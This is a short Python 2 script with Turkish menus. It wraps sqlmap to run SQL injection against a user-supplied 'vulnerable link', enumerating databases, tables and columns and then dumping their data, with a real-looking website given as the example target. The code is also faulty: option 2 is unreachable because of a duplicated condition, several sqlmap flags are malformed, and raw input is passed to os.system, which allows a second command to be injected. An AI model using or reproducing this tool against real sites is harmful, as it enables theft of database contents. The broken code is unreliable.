#!/usr/bin/env python
import os
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet VERI TABANI")
print("""
Veri Tabani Aracina Hosgeldiniz.

1) Sadece Acikli Linki Biliyorum.
2) Acikli Linki ve Veritabani Adini Biliyorum.
3) Acikli Linki, Veritabani Adini ve Tablo Adini Biliyorum.
4) Acikli Linki, Veritabani Adini, Tablo Adini ve Colon Adini Biliyorum.

Ornek Acikli Link: http:/www.suesupriano.com/article.php=id=25
""")

islemno= raw_input("Islem Numarasi Giriniz: ")
if(islemno=="1"):
		acikliLink = raw_input("Acikli Link Giriniz: ")
		os.system("sqlmap -u " + acikliLink + " --dbs --random-agent")
		
elif(islemno=="1"):
		acikliLink = raw_input("Acikli Link Giriniz: ")
		veritabani = raw_input("veritabani Adini Giriniz: ")
		os.system("sqlmap -u " + acikliLink + " --D" + veritabani + " --tables --random-agent")

elif(islemno=="3"):
		acikliLink = raw_input("Acikli Link Giriniz: ")
		veritabani = raw_input("veritabani Adini Giriniz: ")
		tablo = raw_input("Tablo Adini Giriniz: ")
		os.system("sqlmap -u " + acikliLink + " --D" + veritabani + " - " + tablo + " --columns --random-agent")

elif(islemno=="4"):
		acikliLink = raw_input("Acikli Link Giriniz: ")
		veritabani = raw_input("veritabani Adini Giriniz: ")
		tablo = raw_input("Tablo Adini Giriniz: ")
		colon = raw_input("Colon Adini Giriniz: ")
		os.system("sqlmap -u " + acikliLink + " --D" + veritabani + " - " + tablo + " -C" + colon + " --dump --random-agent")
		
else:
		print("Hatali Tuslama")
			
